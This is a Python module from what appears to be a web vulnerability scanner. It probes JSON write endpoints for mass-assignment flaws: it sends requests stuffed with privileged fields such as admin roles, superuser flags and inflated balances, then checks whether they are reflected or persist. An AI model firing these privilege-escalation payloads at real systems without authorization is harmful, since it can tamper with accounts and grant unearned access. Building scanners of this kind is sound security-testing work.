"""Mass-assignment probes against JSON POST/PUT/PATCH endpoints."""

from __future__ import annotations

import json

import httpx

from shroodler.models import Finding
from shroodler.pacer import Pacer
from shroodler.probes.common import body_text, dedupe, request

EXTRA_FIELDS: dict = {
    "role": "admin",
    "isAdmin": True,
    "admin": True,
    "is_superuser": True,
    "permissions": ["admin"],
    "group": "admin",
    "level": 9999,
    "verified": True,
    "approved": True,
    "balance": 999999,
    "credits": 999999,
}

_WRITE_METHODS = {"POST", "PUT", "PATCH"}


def _json_body(resp: httpx.Response | None):
    text = body_text(resp)
    try:
        return json.loads(text)
    except (json.JSONDecodeError, TypeError, ValueError):
        return None


def _contains_injected(value) -> list[str]:
    hits: list[str] = []

    def walk(node) -> None:
        if isinstance(node, dict):
            for key, item in node.items():
                if key in EXTRA_FIELDS:
                    expected = EXTRA_FIELDS[key]
                    if item == expected or str(item) == str(expected):
                        hits.append(str(key))
                walk(item)
        elif isinstance(node, list):
            for item in node:
                walk(item)
        elif isinstance(node, str):
            for key, expected in EXTRA_FIELDS.items():
                if key in node and str(expected) in node:
                    hits.append(key)

    walk(value)
    return hits


def _base_payload(resp: httpx.Response | None) -> dict:
    parsed = _json_body(resp)
    if isinstance(parsed, dict):
        return dict(parsed)
    return {}


def _looks_json(content_type: str, body: str) -> bool:
    ctype = (content_type or "").lower()
    if "application/json" in ctype or ctype.endswith("+json"):
        return True
    text = (body or "").lstrip()
    return text.startswith("{") or text.startswith("[")


def probe_mass_assignment(
    url: str,
    method: str,
    cookie_header: str,
    *,
    content_type: str = "",
    client: httpx.Client | None = None,
    pacer: Pacer | None = None,
) -> list[Finding]:
    """Replay writes with extra privileged fields and watch for reflection."""
    method_u = (method or "POST").upper()
    if method_u not in _WRITE_METHODS:
        return []

    clean = request(
        method_u,
        url,
        cookie_header=cookie_header,
        extra_headers={"Content-Type": "application/json", "Accept": "application/json"},
        client=client,
        pacer=pacer,
        json={},
    )
    clean_text = body_text(clean)
    if not _looks_json(content_type, clean_text) and "json" not in (content_type or "").lower():
        # Still probe JSON-shaped writes; skip clearly non-JSON HTML.
        if "<html" in clean_text.lower() and "application/json" not in (content_type or "").lower():
            return []

    payload = {**_base_payload(clean), **EXTRA_FIELDS}
    polluted = request(
        method_u,
        url,
        cookie_header=cookie_header,
        extra_headers={"Content-Type": "application/json", "Accept": "application/json"},
        client=client,
        pacer=pacer,
        json=payload,
    )
    polluted_parsed = _json_body(polluted)
    polluted_text = body_text(polluted)
    hits = _contains_injected(polluted_parsed if polluted_parsed is not None else polluted_text)
    if not hits:
        # Fallback: injected keys echoed as text
        hits = [key for key in EXTRA_FIELDS if key in polluted_text and str(EXTRA_FIELDS[key]) in polluted_text]
        clean_hits = [
            key
            for key in EXTRA_FIELDS
            if key in clean_text and str(EXTRA_FIELDS[key]) in clean_text
        ]
        hits = [key for key in hits if key not in clean_hits]
    if not hits:
        return []

    findings = [
        Finding(
            id="mass-assignment",
            severity="high",
            category="auth",
            url=url,
            description=(
                f"{method_u} accepted extra privileged fields and reflected them "
                f"({', '.join(hits[:6])})."
            ),
            evidence=f"fields={','.join(hits[:8])}",
            confidence="confirmed",
        )
    ]

    follow = request(
        "GET",
        url,
        cookie_header=cookie_header,
        extra_headers={"Accept": "application/json"},
        client=client,
        pacer=pacer,
    )
    follow_parsed = _json_body(follow)
    follow_text = body_text(follow)
    persisted = _contains_injected(follow_parsed if follow_parsed is not None else follow_text)
    if persisted:
        findings.append(
            Finding(
                id="mass-assignment-persistent",
                severity="critical",
                category="auth",
                url=url,
                description=(
                    "A subsequent GET still returned injected privileged fields "
                    f"({', '.join(persisted[:6])})."
                ),
                evidence=f"fields={','.join(persisted[:8])}",
                confidence="confirmed",
            )
        )
    return dedupe(findings)
